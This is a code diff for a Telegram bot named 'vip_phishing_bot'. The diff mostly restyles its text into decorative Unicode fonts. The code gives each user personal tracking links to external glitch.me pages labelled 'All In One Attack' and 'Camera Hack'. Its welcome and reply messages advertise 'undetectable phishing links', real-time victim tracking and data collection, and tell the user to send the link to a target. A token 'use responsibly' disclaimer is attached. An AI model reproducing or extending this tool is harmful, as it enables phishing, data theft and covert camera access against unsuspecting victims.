@@ -15,16 +15,23 @@ app = Client("vip_phishing_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT
 @app.on_message(filters.private & filters.command("start"))
 async def start_command(client, message):
     keyboard = InlineKeyboardMarkup([
-        [InlineKeyboardButton("🛠 ALL-IN-ONE", callback_data="all_in_one"),
-         InlineKeyboardButton("📸 CAM HACK", callback_data="camera_hack")]
+        [InlineKeyboardButton("🛠 𝐀𝐋𝐋 𝐈𝐍 𝐎𝐍𝐄", callback_data="all_in_one"),
+         InlineKeyboardButton("📸 𝐂𝐀𝐌𝐄𝐑𝐀 𝐇𝐀𝐂𝐊", callback_data="camera_hack")]
     ])
     
     welcome_text = (
-        "🔰 Welcome to the Ultimate Phishing Bot! 🔰\n\n"
-        "🔥 Generate undetectable phishing links in seconds & send them to your targets!\n"
-        "🎯 Track victims in real-time & collect data effortlessly.\n\n"
-        "🛑 Warning: High Security System Activated 🛑\n\n"
-        "⚠️ Use responsibly! Any misuse is your own responsibility. ⚠️"
+        "🌀 ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴛʜᴇ ᴜʟᴛɪᴍᴀᴛᴇ ᴘʜɪsʜɪɴɢ ʙᴏᴛ ! 🌀\n\n"
+        
+        " 💠 ɢᴀʀᴇʀᴀᴛᴇ ᴜɴᴅᴇᴛᴇᴄᴛᴀʙʟᴇ ᴘʜɪsʜɪɴɢ ʟɪɴᴋ ɪɴ sᴇᴄᴏɴᴅs & sᴇɴᴅ ᴛʜᴇᴍ ᴛᴏ ʏᴏᴜʀ ᴛᴀʀɢᴇᴛs 💠\n"
+        
+        
+        "♻️ ᴛʀᴀᴄᴋ ᴠɪᴄᴛɪᴍs ɪɴ ʀᴇᴀʟ-ᴛɪᴍᴇ & ᴄᴏʟʟᴇᴄᴛ ᴅᴀᴛᴀ ᴇғғᴏʀᴛʟᴇssʟʏ ♻️\n\n"
+        
+        
+        "⚠ ᴡᴀʀɴɪɴɢ ⚠ - ʜɪɢʜ sᴇᴄᴜʀɪᴛʏ sʏsᴛᴇᴍ ᴀᴄᴛɪᴠᴀᴛᴇᴅ 💀\n\n"
+        
+        
+        "📥 ᴜsᴇ ʀᴇsᴘᴏɴsɪʙʟʏ! ᴀɴʏ ᴍɪsᴜsᴇ ɪs ʏᴏᴜʀ ᴏᴡɴ ʀᴇsᴘᴏɴsɪʙɪʟɪᴛʏ 🥀 "
     )
 
     await message.reply_text(welcome_text, reply_markup=keyboard)
@@ -37,8 +44,8 @@ async def callback_handler(client, callback_query):
 
     # 🌐 Generate Phishing Links
     links = {
-        "all_in_one": ("ALL-IN-ONE ATTACK", f"https://trail-charm-waterlily.glitch.me/?id={user_id}"),
-        "camera_hack": ("CAMERA HACK", f"https://four-political-blouse.glitch.me/?id={user_id}")
+        "all_in_one": ("𝐀ʟʟ 𝐈ɴ 𝐎ɴᴇ 𝐀ᴛᴛᴀᴄᴋ", f"https://trail-charm-waterlily.glitch.me/?id={user_id}"),
+        "camera_hack": ("𝐂ᴀᴍᴇʀᴀ 𝐇ᴀᴄᴋ", f"https://four-political-blouse.glitch.me/?id={user_id}")
     }
 
     if data in links:
@@ -60,9 +67,12 @@ async def callback_handler(client, callback_query):
 
         # 📝 Send the Generated Link (Without Code Format)
         message_text = (
-            f"🛠 *Page Name:* {page_name}\n"
-            f"🔗 *Link:* {link}\n\n"
-            f"🎯 Just send this to your target!"
+            f"🛠 𝐏ᴀɢᴇ 𝐍ᴀᴍᴇ ➪ {page_name}\n"
+            
+            f" 𝐋ɪɴᴋ ➪ {link}\n\n"
+            
+            
+            f"☣️𝐉ᴜsᴛ 𝐒ᴇɴᴅ 𝐓ʜɪs 𝐋ɪɴᴋ 𝐓ᴏ 𝐘ᴏᴜʀ 𝐓ᴀʀɢᴇᴛ ☣️"
         )
 
         await callback_query.message.reply_text(
